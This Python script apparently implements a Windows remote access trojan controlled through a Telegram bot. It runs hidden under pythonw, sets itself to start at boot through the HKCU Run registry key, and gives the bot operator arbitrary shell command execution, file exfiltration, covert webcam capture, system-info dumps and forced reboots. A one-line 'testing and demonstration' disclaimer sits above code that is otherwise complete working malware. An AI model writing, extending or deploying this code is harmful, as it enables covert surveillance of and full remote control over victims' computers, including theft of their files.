"""
Telegram Remote Control Bot using Telethon
For testing and demonstration purposes only

Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID> [DELAY_SECONDS]
"""

import os
import subprocess
import tempfile
import time
import sys
from datetime import datetime
from telethon import TelegramClient, events
import cv2
import winreg

# ============================================
# STARTUP DELAY LOGIC (Top of script)
# ============================================
# If a 5th argument is provided (like from the Registry), wait. 
# Otherwise, default to 0 for manual runs.
STARTUP_DELAY = int(sys.argv[5]) if len(sys.argv) == 6 else 0

if STARTUP_DELAY > 0:
    # No print here because pythonw has no console to print to
    time.sleep(STARTUP_DELAY)

# ============================================
# CONFIGURATION - From command line arguments
# ============================================
if len(sys.argv) < 5:
    print("Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID>")
    sys.exit(1)

API_ID = sys.argv[1]
API_HASH = sys.argv[2]
BOT_TOKEN = sys.argv[3]
AUTHORIZED_USER_ID = int(sys.argv[4])

# Persistence settings
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
APP_NAME = "TelegramSystemBot"

# Global variable to store persistence setup status
persistence_setup_status = {"enabled": False, "error": None}

# ============================================
# Initialize the bot
# ============================================
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    return user_id == AUTHORIZED_USER_ID

def setup_persistence():
    """Setup auto-run on system boot via Windows Registry"""
    global persistence_setup_status
    
    try:
        # Get the full path to the current script
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            script_path = sys.executable
        else:
            # Running as Python script
            current_script = os.path.abspath(sys.argv[0])
            python_dir = os.path.dirname(sys.executable)
            pythonw_path = os.path.join(python_dir, 'pythonw.exe')
            
            if not os.path.exists(pythonw_path):
                pythonw_path = sys.executable
            
            # HARDCODED 120: We add '120' to the registry string so it 
            # always waits when launched by Windows, even if you ran it manually now.
            script_path = f'"{pythonw_path}" "{current_script}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID} 120'
        
        # Open registry key
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0,
            winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )
        
        # Set the registry value (Overwrite to ensure the 120 is present)
        winreg.SetValueEx(
            key,
            APP_NAME,
            0,
            winreg.REG_SZ,
            script_path
        )
        winreg.CloseKey(key)
        
        persistence_setup_status = {"enabled": True, "error": None}
        return True
        
    except Exception as e:
        persistence_setup_status = {"enabled": False, "error": str(e)}
        return False

def check_persistence():
    """Check if persistence is currently enabled"""
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY,
            0,
            winreg.KEY_QUERY_VALUE
        )
        winreg.QueryValueEx(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except:
        return False

# ============================================
# /start command
# ============================================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    if not is_authorized(event.sender_id):
        await event.reply("⛔ Unauthorized access attempt logged.")
        return
    
    is_enabled = check_persistence()
    persistence_msg = "✅ Enabled (120s delay)" if is_enabled else "❌ Not configured"
    
    help_text = f"""
🤖 **Remote Control Bot - Active**

**Available Commands:**
/screenshot - Take a photo using laptop camera
/get_file <filename> - Download a file from bot directory
/reboot - Restart the system (Immediate)
/systeminfo - Get system information
/cmd <command> - Execute CMD command

**Status:**
🔄 Auto-Start on Boot: {persistence_msg}
"""
    await event.reply(help_text)

# ============================================
# /screenshot command
# ============================================
@bot.on(events.NewMessage(pattern='/screenshot'))
async def screenshot_handler(event):
    if not is_authorized(event.sender_id):
        return
    
    await event.reply("📸 Accessing camera...")
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await event.reply("❌ Cannot access camera")
            return
        
        time.sleep(2) # Warmup
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            await event.reply("❌ Failed to capture")
            return
        
        temp_path = os.path.join(tempfile.gettempdir(), 'snap.jpg')
        cv2.imwrite(temp_path, frame)
        await bot.send_file(event.chat_id, temp_path)
        os.remove(temp_path)
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /get_file command
# ============================================
@bot.on(events.NewMessage(pattern=r'/get_file\s+(.+)'))
async def get_file_handler(event):
    if not is_authorized(event.sender_id):
        return
    filename = event.pattern_match.group(1).strip()
    try:
        if os.path.exists(filename):
            await bot.send_file(event.chat_id, filename)
        else:
            await event.reply("❌ File not found")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /reboot command
# ============================================
@bot.on(events.NewMessage(pattern='/reboot'))
async def reboot_handler(event):
    if not is_authorized(event.sender_id):
        return
    await event.reply("🔄 Rebooting immediately...")
    try:
        # Changed to /t 000 as requested
        subprocess.Popen(['shutdown', '/r', '/t', '000'], shell=True)
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /systeminfo command
# ============================================
@bot.on(events.NewMessage(pattern='/systeminfo'))
async def systeminfo_handler(event):
    if not is_authorized(event.sender_id):
        return
    try:
        result = subprocess.run(['systeminfo'], capture_output=True, text=True, shell=True)
        output = result.stdout
        if len(output) > 4000:
            temp_path = os.path.join(tempfile.gettempdir(), 'sys.txt')
            with open(temp_path, 'w') as f: f.write(output)
            await bot.send_file(event.chat_id, temp_path)
        else:
            await event.reply(f"```\n{output}\n```")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# /cmd command
# ============================================
@bot.on(events.NewMessage(pattern=r'/cmd\s+(.+)'))
async def cmd_handler(event):
    if not is_authorized(event.sender_id):
        return
    command = event.pattern_match.group(1).strip()
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, shell=True)
        stdout, stderr = process.communicate(timeout=120)
        output = stdout if stdout else stderr
        await event.reply(f"```\n{output[:4000]}\n```")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# ============================================
# Start the bot
# ============================================
if __name__ == '__main__':
    # Setup persistence (it will write the 120s delay into registry)
    setup_persistence()
    bot.run_until_disconnected()
